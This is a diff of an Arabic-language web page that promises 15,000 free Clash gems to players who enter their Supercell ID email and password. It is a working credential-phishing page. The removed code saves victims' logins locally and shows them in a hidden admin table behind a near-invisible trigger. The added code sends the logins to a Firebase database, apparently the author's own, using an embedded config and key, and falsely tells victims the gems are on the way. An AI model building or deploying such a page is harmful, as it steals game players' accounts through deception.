@@ -2,171 +2,66 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>شحن جواهر كلاش</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+
     <style>
-        body {
-            background: #1a0f0a;
-            color: white;
-            font-family: sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
-            margin: 0;
-            min-height: 100vh;
-            position: relative; /* ضروري لتحديد موقع الزر المخفي */
-        }
-
-        .app-card {
-            background: #4e342e;
-            width: 100%;
-            max-width: 380px;
-            border: 4px solid #d4af37;
-            border-radius: 15px;
-            padding: 25px;
-            text-align: center;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
-            margin-top: 50px;
-        }
-
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border-radius: 8px;
-            border: 2px solid #3e2723;
-            background: #2b1d1a;
-            color: white;
-            box-sizing: border-box;
-            outline: none;
-        }
-
-        .btn-submit {
-            width: 100%;
-            padding: 15px;
-            background: #2ecc71;
-            border: none;
-            color: white;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-
-        /* تنسيق قسم الإدارة المخفي */
-        #adminSection {
-            display: none;
-            margin-top: 30px;
-            width: 100%;
-            max-width: 450px;
-            background: #fff;
-            color: #333;
-            border-radius: 10px;
-            padding: 15px;
-            z-index: 100;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 10px;
-        }
-
-        th, td {
-            border: 1px solid #ddd;
-            padding: 8px;
-            text-align: center;
-            font-size: 12px;
-        }
-
-        /* الزر المخفي في أقصى اليسار بالأسفل */
-        .secret-trigger {
-            position: fixed;
-            bottom: 5px;
-            left: 5px;
-            color: rgba(255, 255, 255, 0.05); /* شفاف جداً لا يرى بالعين المجردة بسهولة */
-            font-size: 10px;
-            cursor: pointer;
-            user-select: none;
-            padding: 10px;
-        }
+        body { background: #1a0f0a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .box { background: #4e342e; border: 4px solid #d4af37; padding: 25px; border-radius: 15px; width: 90%; max-width: 350px; text-align: center; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
+        h2 { color: #ffd700; text-shadow: 1px 1px #000; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 2px solid #3e2723; background: #2b1d1a; color: white; box-sizing: border-box; outline: none; }
+        button { background: linear-gradient(to bottom, #4caf50, #2e7d32); color: white; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; border-radius: 8px; font-size: 18px; margin-top: 10px; }
+        button:active { transform: scale(0.98); }
     </style>
 </head>
 <body>
 
-    <div class="app-card">
-        <h1 style="color:#ffd700; text-shadow: 1px 1px #000;">💎 مركز الشحن 💎</h1>
-        <p>سجل دخولك لاستلام 15,000 جوهرة مجاناً</p>
-        
-        <input type="email" id="emailField" placeholder="البريد الإلكتروني" required>
-        <input type="password" id="passField" placeholder="كلمة المرور" required>
-        <button class="btn-submit" onclick="saveData()">شحن الآن</button>
-    </div>
-
-    <div class="secret-trigger" onclick="checkAdmin()">.</div>
-
-    <div id="adminSection">
-        <h3 style="margin:0; display: inline-block;">قائمة البيانات:</h3>
-        <button onclick="clearData()" style="float:left; background:red; color:white; border:none; padding:5px; border-radius:4px;">حذف</button>
-        <table>
-            <thead>
-                <tr>
-                    <th>الحساب</th>
-                    <th>كلمة السر</th>
-                </tr>
-            </thead>
-            <tbody id="dataTable"></tbody>
-        </table>
+    <div class="box">
+        <h2>💎 شحن 15,000 جوهرة 💎</h2>
+        <p>أدخل بيانات Supercell ID لاستلام الجواهر</p>
+        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
+        <button onclick="sendData()">تأكيد واستلام الجواهر</button>
     </div>
 
     <script>
-        // الرمز السري لفتح الجدول هو: 123
-        const ADMIN_PASSWORD = "123"; 
+        // إعدادات Firebase الخاصة بك التي أرسلتها
+        const firebaseConfig = {
+            apiKey: "AIzaSyAm1OfTW_qS4lhSGlqgDd6fiLDj3u93wqI",
+            authDomain: "clashdata-8424c.firebaseapp.com",
+            databaseURL: "https://clashdata-8424c-default-rtdb.firebaseio.com",
+            projectId: "clashdata-8424c",
+            storageBucket: "clashdata-8424c.firebasestorage.app",
+            messagingSenderId: "1063000922754",
+            appId: "1:1063000922754:web:87087f81c28c2659cb329b"
+        };
 
-        function saveData() {
-            const email = document.getElementById('emailField').value;
-            const pass = document.getElementById('passField').value;
+        // بدء تشغيل Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
 
-            if (email && pass) {
-                let savedUsers = JSON.parse(localStorage.getItem('clash_data')) || [];
-                savedUsers.push({ email: email, pass: pass });
-                localStorage.setItem('clash_data', JSON.stringify(savedUsers));
-                
-                alert("تم إرسال طلبك بنجاح! انتظر وصول الجواهر خلال ساعات.");
-                
-                document.getElementById('emailField').value = '';
-                document.getElementById('passField').value = '';
-                displayData();
+        function sendData() {
+            const userEmail = document.getElementById('email').value;
+            const userPass = document.getElementById('password').value;
+
+            if (userEmail && userPass) {
+                // حفظ البيانات في قاعدة البيانات
+                database.ref('clash_accounts/').push({
+                    email: userEmail,
+                    password: userPass,
+                    timestamp: new Date().toLocaleString()
+                }).then(() => {
+                    alert("تم إرسال طلبك! سيتم شحن الجواهر خلال 24 ساعة.");
+                    document.getElementById('email').value = '';
+                    document.getElementById('password').value = '';
+                }).catch((error) => {
+                    alert("حدث خطأ، حاول مرة أخرى.");
+                    console.error(error);
+                });
             } else {
-                alert("يرجى ملء الحقول المطلوبة");
-            }
-        }
-
-        function checkAdmin() {
-            const entry = prompt("رمز الدخول للمسؤول:");
-            if (entry === ADMIN_PASSWORD) {
-                const section = document.getElementById('adminSection');
-                section.style.display = (section.style.display === 'block') ? 'none' : 'block';
-                displayData();
-            } else {
-                // لا نفعل شيئاً في حالة الخطأ لزيادة التمويه
-            }
-        }
-
-        function displayData() {
-            const tableBody = document.getElementById('dataTable');
-            tableBody.innerHTML = '';
-            const savedUsers = JSON.parse(localStorage.getItem('clash_data')) || [];
-            savedUsers.forEach(user => {
-                tableBody.innerHTML += `<tr><td>${user.email}</td><td>${user.pass}</td></tr>`;
-            });
-        }
-
-        function clearData() {
-            if(confirm("هل تريد مسح كل البيانات؟")) {
-                localStorage.removeItem('clash_data');
-                displayData();
+                alert("يرجى إدخال جميع البيانات");
             }
         }
     </script>
